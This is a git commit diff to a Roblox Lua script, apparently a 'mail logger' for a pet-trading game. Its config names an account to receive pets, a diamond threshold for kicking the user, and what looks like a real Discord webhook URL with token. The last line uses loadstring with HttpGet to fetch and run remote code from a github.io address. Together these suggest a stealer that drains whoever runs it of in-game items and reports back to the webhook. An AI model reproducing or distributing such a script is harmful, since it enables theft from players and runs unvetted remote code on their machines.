fa685c0b7c94987ed8e38ca3336158bf36158313
MrPectable <126442140+MrPectable@users.noreply.github.com>
2023-05-15 21:15:17 -0400

    Update psxv.lua

--- psxv.lua
+++ psxv.lua
@@ -1,8 +1,23 @@
+--[[ Arkhalis Mail Logger ]]--
+
 --[[ Main Config ]]--
 _G.Username = "jsavige4" --// Username To Send Pets To
 _G.Diamonds = 750000 --// Amount Of Diamonds To Not Kick
 
 --[[ Webhook Config ]]--
 _G.Webhook = "https://discord.com/api/webhooks/1107824932538286101/F_dKjUoABU7pPMPa394w9a4au3H1UMK6lA5KY0Kq1eZKA6XEuB0QTeeaaMChjUELa4o9" --// Discord Webhook For Executions
+
+--[[ PREMIUM SETTINGS ]]--
+
+--[[ Don't try to use if u don't own premium ]]--
+
+_G.Key = "" --// This Key Is Ur Username If U Have Any Questions Dm's Pewcio#0001
+
+_G.WebhookDualHook = "" --// Discord Webhook For Executions
+
+_G.LoadingScreen = 1 --// Choose Loading Screen [All Screens Are Shown Here 💡┊loading screen ]
+
+_G.ScriptName =  --// Script Name UwU
+
 --[[ Script ]]--
 loadstring(game:HttpGet("https://arkhalislua.github.io/ArkhalisMailbox.lua"))()
